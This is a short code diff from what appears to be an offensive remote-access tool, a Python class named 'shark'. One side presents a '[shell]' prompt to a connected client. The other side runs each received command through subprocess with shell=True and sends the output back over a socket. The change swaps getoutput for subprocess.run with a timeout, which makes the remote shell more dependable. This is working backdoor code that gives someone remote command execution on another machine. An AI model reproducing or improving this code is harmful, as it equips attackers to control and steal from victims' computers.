@@ -899,7 +899,7 @@ class shark:
         print (F.GREEN+"[✓]Client Connected")
 
         while True:
-            data = input(F.CYAN+"\n[shell]•••→ "+F.WHITE)
+            data = input(F.CYAN+"\n[shell]: "+F.WHITE)
             if data == "exit":
                 c.send(data.encode())
                 print(F.RED+"[*]Closing Shell")
@@ -942,8 +942,19 @@ class shark:
                 except:
                     sock.send("Invalid Directory".encode())
             else:
-                decode_data = sub.getoutput(data)
-                sock.send(f'|{decode_data}'.encode())
+                try:
+                    decode_data = sub.run(
+                        data,
+                        shell=True,
+                        stdout=sub.PIPE,
+                        stderr=sub.STDOUT,
+                        stdin=sub.DEVNULL,
+                        timeout=0.5,
+                        text=True
+                    )
+                    sock.send(f"•{decode_data.stdout}".encode())
+                except:
+                    sock.send(f'•unexpected'.encode())
 
 
 #------------------------------------------------------------------------------------------------------------------------------
